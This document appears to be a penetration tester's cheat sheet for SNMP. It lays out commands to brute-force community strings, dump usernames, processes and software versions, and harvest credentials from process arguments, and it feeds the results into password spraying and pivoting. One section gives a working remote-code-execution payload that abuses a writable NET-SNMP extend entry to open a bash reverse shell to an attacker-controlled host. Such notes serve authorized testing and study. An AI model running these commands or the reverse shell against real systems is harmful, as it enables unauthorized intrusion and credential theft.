# SNMP — Information Disclosure

### What brings you here
UDP port 161 responded during scanning, or SNMP is listed as a service. You want to extract information from it.

---

## Checklist

```bash
# 1. Confirm SNMP is responding
sudo nmap -sU -p 161 <IP>

# 2. Brute force community strings — always do this first
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# 3. Once you have a community string — full walk
snmpwalk -v2c -c <community_string> <IP> | tee snmpwalk.txt

# 4. Targeted queries — highest value OIDs
# Running processes
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.2.1.25.6.3.1.2

# Open TCP ports
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.2.1.6.13.1.3

# Usernames
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.4.1.77.1.2.25

# System description / hostname
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.2.1.1.1.0
snmpwalk -v2c -c <community_string> <IP> 1.3.6.1.2.1.1.5.0

# 5. Use braa for faster bulk queries
braa <community_string>@<IP>:.1.3.6.*

# 6. SNMPv3 — if v1/v2 don't work, try to enumerate v3 users
nmap -sU -p 161 --script snmp-brute <IP>
```

---

## What Did You Find?

| Finding | Next action | Link |
|---------|-------------|------|
| Valid community string | Full walk — dump everything | — |
| Usernames in output | Add to user list, try against SSH/SMB/web | [../../CRED_TRACKER.md](../../CRED_TRACKER.md) |
| Running processes reveal services | Check for internal-only services, use for pivoting | [../../cheatsheets/pivoting_and_port_forwarding.md](../../cheatsheets/pivoting_and_port_forwarding.md) |
| Credentials in process args | Direct credential capture | [../../CRED_TRACKER.md](../../CRED_TRACKER.md) |
| Write community string (`rwcommunity`) | Can set OIDs — potential RCE via NET-SNMP extend | — |
| Software versions revealed | Cross-reference against known vulns | [service_exploitation.md](service_exploitation.md) |

---

## SNMP Write Access — RCE via NET-SNMP Extend

If you find `rwcommunity` or `rwcommunity6` in the SNMP config:

```bash
# Add a command execution extension
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <write_community> <IP> \
  'nsExtendStatus."cmd"' = createAndGo \
  'nsExtendCommand."cmd"' = /bin/sh \
  'nsExtendArgs."cmd"' = '-c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'

# Trigger it
snmpwalk -v 2c -c <write_community> <IP> NET-SNMP-EXTEND-MIB::nsExtendOutput
```

---

## Dead Ends

| Situation | What to try |
|-----------|-------------|
| `public` / `private` denied | Use a bigger wordlist, or try SNMPv3 |
| Walk returns empty | Try v1: `snmpwalk -v1 -c <string> <IP>` |
| No useful information in walk | Focus on other services; SNMP info still useful for username/version correlation |

---

## Loot to Collect

- Username list from `1.3.6.1.4.1.77.1.2.25`
- Process list (look for passwords passed as command-line args)
- Network interface info — reveals internal subnets
- Software/version inventory
- Community strings discovered (try against other network devices)

---

## → Where to go next
- Found usernames → try password spray on SSH/SMB with [../../STUCK.md](../../STUCK.md) credential list
- Found credentials in process args → [../../CRED_TRACKER.md](../../CRED_TRACKER.md)
- Found internal subnets → [../../cheatsheets/pivoting_and_port_forwarding.md](../../cheatsheets/pivoting_and_port_forwarding.md)
- Nothing worked → [../../STUCK.md](../../STUCK.md)
